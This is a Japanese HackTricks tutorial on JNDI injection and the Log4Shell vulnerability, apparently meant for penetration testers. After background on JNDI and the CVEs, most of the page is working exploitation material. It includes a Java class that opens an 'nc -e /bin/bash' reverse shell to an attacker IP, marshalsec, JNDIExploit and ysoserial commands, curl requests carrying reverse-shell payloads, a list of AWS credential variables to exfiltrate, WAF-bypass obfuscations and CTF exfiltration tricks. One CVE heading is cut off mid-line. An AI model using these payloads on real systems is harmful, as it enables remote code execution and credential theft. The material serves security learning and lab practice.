# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>で</strong>!</summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**する。
- **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する。

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて修正できるようにしましょう。Intruderはあなたの攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリケーション、クラウドシステムまでの技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm_source=referral\&utm_campaign=hacktricks) 今日。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## 基本情報

JNDIは1990年代後半からJavaに統合されており、ディレクトリサービスとして機能し、Javaプログラムが名前付けシステムを介してデータやオブジェクトを見つけることを可能にします。さまざまなディレクトリサービスをサポートするサービスプロバイダインターフェース（SPI）を介して、リモートJavaオブジェクトを含むさまざまなシステムからデータを取得できます。一般的なSPIには、CORBA COS、Java RMI Registry、LDAPなどがあります。

### JNDI Naming Reference
JNDI Naming Referencesを使用してJavaオブジェクトを格納および取得できます。これには2つの形式があります：

- **Reference Addresses**：オブジェクトの場所を指定します（例：_rmi://server/ref_）、指定されたアドレスから直接取得できます。
- **Remote Factory**：リモートファクトリクラスを参照します。アクセス時に、クラスはリモート位置からダウンロードされてインスタンス化されます。

ただし、このメカニズムは悪用される可能性があり、任意のコードの読み込みと実行につながる可能性があります。対策として：

- **RMI**：JDK 7u21以降、デフォルトで`java.rmi.server.useCodeabseOnly = true`に設定され、リモートオブジェクトの読み込みが制限されます。セキュリティマネージャーはさらに読み込むことができるものを制限します。
- **LDAP**：JDK 6u141、7u131、8u121以降、デフォルトで`com.sun.jndi.ldap.object.trustURLCodebase = false`に設定され、リモートで読み込まれたJavaオブジェクトの実行をブロックします。`true`に設定すると、セキュリティマネージャーの監視なしにリモートコードの実行が可能になります。
- **CORBA**：特定のプロパティはありませんが、セキュリティマネージャーは常にアクティブです。

ただし、JNDIリンクを解決する責任がある**Naming Manager**には組み込みのセキュリティメカニズムが欠けており、任意のソースからオブジェクトを取得できる可能性があります。これにより、RMI、LDAP、CORBAの保護が回避され、任意のJavaオブジェクトの読み込みや既存のアプリケーションコンポーネント（ガジェット）の悪用による悪意のあるコードの実行が可能になります。

悪用可能なURLの例：

- _rmi://attacker-server/bar_
- _ldap://attacker-server/bar_
- _iiop://attacker-server/bar_

保護措置があるにもかかわらず、主に信頼できないソースからのJNDIの読み込みに対する保護が欠けていることや、既存の保護をバイパスする可能性があるため、脆弱性が残っています。

### JNDIの例

![](<../../.gitbook/assets/image (655) (1) (1).png>)

**`PROVIDER_URL`**を設定していても、lookupで異なるものを指定することができ、アクセスされます：`ctx.lookup("<attacker-controlled-url>")` これが攻撃者が悪用して任意のオブジェクトを彼が制御するシステムから読み込む方法です。

### CORBA概要

CORBA（Common Object Request Broker Architecture）は、リモートオブジェクトを一意に識別するために**Interoperable Object Reference (IOR)**を使用します。このリファレンスには、次のような重要な情報が含まれます：

- **Type ID**：インターフェースの一意の識別子。
- **Codebase**：スタブクラスを取得するためのURL。

CORBAは基本的に脆弱ではありません。通常、セキュリティを確保するには次の手順が必要です：

- **セキュリティマネージャーのインストール**。
- セキュリティマネージャーを構成して、潜在的に悪意のあるコードベースへの接続を許可します。これは、ソケット権限（例：````permissions java.net.SocketPermission "*:1098-1099", "connect";````）や、悪意のあるファイルが配置される特定のディレクトリに対するファイル読み取り権限（普遍的に（````permission java.io.FilePermission "<<ALL FILES>>", "read";````）または）などが含まれます。

ただし、一部のベンダーポリシーは寛大であり、これらの接続をデフォルトで許可する場合があります。

### RMIコンテキスト

RMI（Remote Method Invocation）に関しては、状況は多少異なります。CORBAと同様に、任意のクラスのダウンロードはデフォルトで制限されています。RMIを悪用するには、通常、セキュリティマネージャーを回避する必要があります。これはCORBAでも重要なことです。

### LDAP

まず、**Search**と**Lookup**を区別する必要があります。\
**Search**は、`ldap://localhost:389/o=JNDITutorial`のようなURLを使用して、LDAPサーバーからJNDITutorialオブジェクトを見つけ、その属性を**取得**します。\
**Lookup**は、**名前付けサービス**向けであり、**名前にバインドされているものを取得**したいときに使用されます。

LDAP検索が`SearchControls.setReturningObjFlag() with `true`で呼び出された場合、返されたオブジェクトは再構築されます。

したがって、これらのオプションを攻撃する方法はいくつかあります。\
**攻撃者はLDAPレコードにペイロードを導入し、それらを実行されるシステムに導入**することができます（LDAPサーバーにアクセスできる場合、多数のマシンを侵害するのに非常に便利です）。これを悪用する別の方法は、たとえばLDAP検索で**MitM攻撃**を実行することです。

アプリケーションがJNDI LDAP URLを解決するようにすることができる場合、検索されるLDAPを制御でき、エクスプロイト（log4shell）を送り返すことができます。

#### シリアル化エクスプロイト

![](<../../.gitbook/assets/image (654) (1) (1) (1).png>)

**エクスプロイトはシリアル化**され、デシリアル化されます。\
`trustURLCodebase`が`true`の場合、攻撃者はコードベースに自分のクラスを提供できます。そうでない場合は、クラスパス内のガジェットを悪用する必要があります。

#### JNDIリファレンスエクスプロイト

このLDAPを攻撃するのは**JavaFactoryリファレンス**を使用する方が簡単です：

![](<../../.gitbook/assets/image (660) (1) (1).png>)

## Log4Shell脆弱性

この脆弱性は、Log4jが`${prefix:name}`形式の[**特別な構文**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution)をサポートしているために導入されます。ここで、`prefix`はさまざまな[**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html)の1つであり、`name`は評価されるべきものです。たとえば、`${java:version}`は現在実行中のJavaのバージョンです。

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313)は`jndi` Lookup機能を導入しました。この機能により、JNDIを介して変数を取得できます。通常、キーは自動的に`java:comp/env/`で接頭辞が付けられます。ただし、キー自体に**":"**が含まれる場合、このデフォルトの接頭辞は適用されません。

キーに**":"**が含まれる場合、`${jndi:ldap://example.com/a}`のように、**接頭辞はなく、LDAPサーバーがオブジェクトをクエリ**します。これらのLookupsは、Log4jの構成およびログ行の記録時の両方で使用できます。

したがって、**ユーザーが制御する情報を処理する脆弱なLog4jのバージョン**を取得するためには、**唯一必要なもの**です。そして、これはJavaアプリケーションが情報をログに記録するために広く使用されているライブラリであるため（インターネット向けアプリケーションも含まれます）、例えばHTTPヘッダーのような情報をログに記録するためにlog4jが使用されることが非常に一般的でした。ただし、log4jはHTTP情報だけでなく、開発者が指定した任意の入力やデータをログに記録するために使用されます。

## Log4Shell関連CVEの概要

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **[Critical]**
この脆弱性は、2.0-beta9から2.14.1までのバージョンに影響を与える`log4j-core`コンポーネントの重大な**信頼されていないデシリアライゼーションの欠陥**であり、**リモートコード実行（RCE）**を可能にします。攻撃者がシステムを乗っ取ることができます。この問題は、アリババクラウドセキュリティチームのChen Zhaojunによって報告され、さまざまなApacheフレームワークに影響を与えます。バージョン2.15.0の初期の修正は不完全でした。防御のためのSigmaルールが利用可能です（[Rule 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j_fields.yml)、[Rule 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j.yml)）。

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **[Critical]**
最初は低評価でしたが後に重要度が引き上げられたこのCVEは、CVE-2021-44228の2.15.0の不完全な修正からの**サービス拒否（DoS）**の欠陥です。これは、非デフォルトの構成に影響を与え、攻撃者がクラフトされたペイロードを使用してDoS攻撃を引き起こすことができます。[ツイート](https://twitter.com/marcioalm/status/1471740771581652995)がバイパス方法を示しています。この問題は、バージョン2.16.0および2.12.2でメッセージルックアップパターンを削除し、デフォルトでJNDIを無効にすることで解決されています。

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-202
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **検証**

以前にリストされたいくつかのプラットフォームでは、リクエスト時にログに記録される変数データを挿入することができます。\
これは2つのことに非常に役立ちます:

* 脆弱性を**検証**するため
* 脆弱性を悪用して情報を**外部流出**するため

たとえば、次のようなリクエストを送信できます:\
または`${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`**のようなもので、**環境変数の値がDNSリクエストで受信された場合**、アプリケーションが脆弱であることがわかります。

他にも**外部流出**しようとする情報があります:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE 情報

{% hint style="info" %}
JDK バージョンが 6u141 より上、7u131 より上、または 8u121 より上のホストは、LDAP クラスローディング攻撃ベクトルに対して保護されています。これは、`com.sun.jndi.ldap.object.trustURLCodebase` のデフォルトの非アクティブ化によるもので、これにより JNDI が LDAP を介してリモートコードベースをロードすることが防止されます。ただし、これらのバージョンは**逆シリアル化攻撃ベクトルに対しては保護されていない**ことに注意することが重要です。

これらの高い JDK バージョンを悪用しようとする攻撃者は、Java アプリケーション内で**信頼されたガジェット**を利用する必要があります。この目的のためには、ysoserial や JNDIExploit などのツールがよく使用されます。一方、低い JDK バージョンを悪用することは比較的簡単です。これらのバージョンは、任意のクラスをロードして実行するように操作することができます。

**詳細情報**（_RMI および CORBA ベクトルの制限など_）については、**前の JNDI Naming リファレンスセクション**を参照するか、[https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/) をご覧ください。
{% endhint %}

### RCE - カスタムペイロードを使用した Marshalsec

これを **THM ボックス** でテストできます: [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

ツール [**marshalsec**](https://github.com/mbechler/marshalsec)（jar バージョンは[**こちら**](https://github.com/RandomRobbieBF/marshalsec-jar)で利用可能）を使用します。このアプローチは、LDAP リファラルサーバーを確立して、接続を二次的な HTTP サーバーにリダイレクトし、そこで脆弱性がホストされます。
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
ターゲットに逆シェルコードを読み込ませるために、以下の内容で`Exploit.java`という名前のJavaファイルを作成します:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
Javaファイルをクラスファイルにコンパイルするには、`javac Exploit.java -source 8 -target 8`を使用します。次に、クラスファイルが含まれるディレクトリで**HTTPサーバー**を起動します: `python3 -m http.server`。**marshalsec LDAPサーバー**がこのHTTPサーバーを参照していることを確認してください。

感染しやすいWebサーバーでのエクスプロイトクラスの実行をトリガーするには、次のようなペイロードをディスパッチします:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**注意:** この脆弱性は、Javaの構成がLDAP経由でのリモートコードベースの読み込みを許可していることに依存しています。これが許可されていない場合は、任意のコードを実行するための信頼できるクラスを悪用することを検討してください。

### RCE - **JNDIExploit**

{% hint style="info" %}
一部の理由により、このプロジェクトはlog4shellの発見後に作者によってgithubから削除されました。[https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2)でキャッシュされたバージョンを見つけることができますが、作者の決定を尊重したい場合は、この脆弱性を悪用する別の方法を使用してください。

さらに、ソースコードはwayback machineには見つからないため、ソースコードを分析するか、実行するjarを実行することによって、何を実行しているのかわからないことを理解して実行する必要があります。
{% endhint %}

この例では、**脆弱なwebサーバーをlog4shellにログ出力する**ために、ポート8080で実行できます: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_READMEに実行方法が記載されています_). この脆弱なアプリは、HTTPリクエストヘッダーの _X-Api-Version_ の内容を脆弱なlog4shellのバージョンでログ出力しています。

その後、**JNDIExploit**のjarファイルをダウンロードして、次のように実行します:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
After reading the code just a couple of minutes, in _com.feihong.ldap.LdapServer_ and _com.feihong.ldap.HTTPServer_ you can see how the **LDAP and HTTP servers are created**. The LDAP server will understand what payload need to be served and will redirect the victim to the HTTP server, which will serve the exploit.\
In _com.feihong.ldap.gadgets_ you can find **some specific gadgets** that can be used to excute the desired action (potentially execute arbitrary code). And in _com.feihong.ldap.template_ you can see the different template classes that will **generate the exploits**.

You can see all the available exploits with **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. Some useful ones are:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
したがって、この例では、すでに脆弱性のあるDockerアプリケーションが実行されています。攻撃するには：
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
攻撃を送信すると、実行したターミナルにいくつかの出力が表示されます**JNDIExploit-1.2-SNAPSHOT.jar**。

**他の攻撃オプションを確認するには`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`をチェックしてください。さらに、必要な場合はLDAPおよびHTTPサーバーのポートを変更できます。**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

前の攻撃と同様に、この脆弱性を悪用するために[JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit)を使用できます。\
被害者に送信するためのURLを生成することができます：
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_この攻撃は、**THMソーラールーム**のような研究室でカスタム生成されたJavaオブジェクトを使用して機能します。ただし、これは一般的には機能しません（デフォルトではJavaはLDAPを使用してリモートコードベースをロードするように構成されていないため）私は、これが信頼されたクラスを悪用して任意のコードを実行するために機能していないと考えています。_

### RCE - ysoserial & JNDI-Exploit-Kit

このオプションは、**特定のクラスのみを信頼し、誰にでも信頼しないように構成されたJavaバージョン**を攻撃するのに非常に役立ちます。したがって、**ysoserial**は、**信頼されたクラスのシリアル化**を生成するために使用され、これらは**任意のコードを実行するためのガジェットとして使用できます**（_ysoserialによって悪用される信頼されたクラスは、攻撃対象のJavaプログラムによって使用される必要があります_）。

**ysoserial**または[**ysoserial-modified**](https://github.com/pimps/ysoserial-modified)を使用して、JNDIによってダウンロードされる逆シリアル化攻撃を作成できます：
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
使用[JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit)生成**JNDIリンク**を、脆弱なマシンからの接続を待つエクスプロイトが含まれるようにします。JNDI-Exploit-Kitによって自動生成される**異なるエクスプロイト**またはあなた自身またはysoserialによって生成された**独自の逆シリアル化ペイロード**を提供することもできます。
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

今後、脆弱性を悪用し、**リバースシェル**を取得するために生成されたJNDIリンクを簡単に使用できます。脆弱なlog4jバージョンに送信するだけです: **`${ldap://10.10.14.10:1389/generated}`**

### バイパス
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ı}}:ldap://...} //Notice the unicode "i"
```
## 自動スキャナー

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - ローカルの脆弱なライブラリを見つける

### テスト用ラボ

* [**LogForge HTB machine**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar room**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Log4Shell攻撃後の利用

この[**CTF解説**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)では、**Log4J**の一部の機能を**悪用**することが**可能**であることがよく説明されています。

Log4jの[**セキュリティページ**](https://logging.apache.org/log4j/2.x/security.html)には興味深い文がいくつかあります：

> バージョン2.16.0（Java 8向け）から、**メッセージルックアップ機能が完全に削除**されました。構成内のルックアップは引き続き機能します。さらに、Log4jは今後、デフォルトでJNDIへのアクセスを無効にします。構成内のJNDIルックアップを明示的に有効にする必要があります。

> バージョン2.17.0（およびJava 7およびJava 6向けの2.12.3および2.3.1）から、**構成内のルックアップ文字列のみが再帰的に展開**されます。他の使用法では、トップレベルのルックアップのみが解決され、ネストされたルックアップは解決されません。

これは、デフォルトでは**`jndi`の悪用**はできないことを意味します。さらに、**再帰的なルックアップ**を行うには、それらを構成する必要があります。

たとえば、このCTFでは、次のようにファイルlog4j2.xmlで構成されていました：
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Env Lookups

[このCTF](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)では、攻撃者は`${sys:cmd}`の値を制御し、環境変数からフラグを外部に送出する必要がありました。\
このページで[**前回のペイロード**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification)で見られるように、**`${env:FLAG}`**などの異なる方法で環境変数にアクセスする方法があります。このCTFではこれは役に立ちませんでしたが、他の実際のシナリオでは役立つかもしれません。

### Exfiltration in Exceptions

CTFでは、log4Jを使用してJavaアプリケーションのstderrにアクセスできませんでしたが、Log4Jの例外はstdoutに送信され、これはPythonアプリケーションで出力されました。これは、例外をトリガーすることでコンテンツにアクセスできることを意味します。フラグを外部に送出するための例外は次のとおりです: **`${java:${env:FLAG}}`.** これは、**`${java:CTF{blahblah}}`**が存在せず、フラグの値が表示される例外が発生するため機能します:

![](<../../.gitbook/assets/image (157).png>)

### Conversion Patterns Exceptions

補足として、新しい[**変換パターン**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout)をインジェクトし、`stdout`に記録される例外をトリガーすることもできます。例えば:

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

これは、エラーメッセージ内のデータを外部に送出するのには役立ちませんでしたが、変換パターンの前にルックアップが解決されなかったため、検出など他の用途には役立つかもしれません。

### Conversion Patterns Regexes

ただし、**正規表現をサポートする変換パターン**を使用して、**バイナリサーチ**や**時間ベース**の動作を悪用して、ルックアップから情報を外部に送出することが可能です。

* **例外メッセージを介したバイナリサーチ**

変換パターン**`%replace`**は、**文字列**から**コンテンツ**を**置換**するために**正規表現**を使用できます。これは次のように機能します: `replace{pattern}{regex}{substitution}`\
この動作を悪用すると、**文字列内で正規表現が一致した場合に例外をトリガー**させることができます（一致しない場合は例外が発生しません）次のように:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Time based**

前のセクションで言及されたように、**`%replace`** は **regexes** をサポートしています。そのため、[**ReDoS ページ**](../regular-expression-denial-of-service-redos.md) からのペイロードを使用して、フラグが見つかった場合に **タイムアウト** を引き起こすことが可能です。\
例えば、`%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` のようなペイロードは、その CTF で **タイムアウト** を引き起こします。

この[**解説記事**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)では、ReDoS 攻撃の代わりに **増幅攻撃** を使用して、応答の時間差を引き起こしました:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> もしフラグが `flagGuess` で始まる場合、フラグ全体が 29 個の `#` で置き換えられます（この文字を使用したのは、おそらくフラグの一部ではないためです）。**その結果の 29 個の `#` それぞれが 54 個の `#` で置き換えられます**。このプロセスは **6 回繰り返され**、合計で ` 29*54*54^6* =`` `` `**`96816014208`  `#`** になります！**
>
> これだけの数の `#` を置き換えると、Flask アプリケーションの 10 秒のタイムアウトが発生し、ユーザーに HTTP ステータスコード 500 が送信されます。（フラグが `flagGuess` で始まらない場合、500 以外のステータスコードが返されます）

## 参考文献

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

脆弱性を見つけて修正を迅速に行うために重要なものを見つけます。Intruder は攻撃対象を追跡し、積極的な脅威スキャンを実行し、API から Web アプリケーション、クラウドシステムまで、全体のテックスタックで問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今すぐ。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)** で AWS ハッキングをゼロからヒーローまで学びましょう</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE</strong></a><strong>!</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks が広告されたり、HackTricks を PDF でダウンロードしたり** したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式 PEASS & HackTricks スワッグ**](https://peass.creator-spring.com) を手に入れる
* 独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) コレクションである [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) をフォローする
* 自分のハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の GitHub リポジトリに PR を提出する

</details>
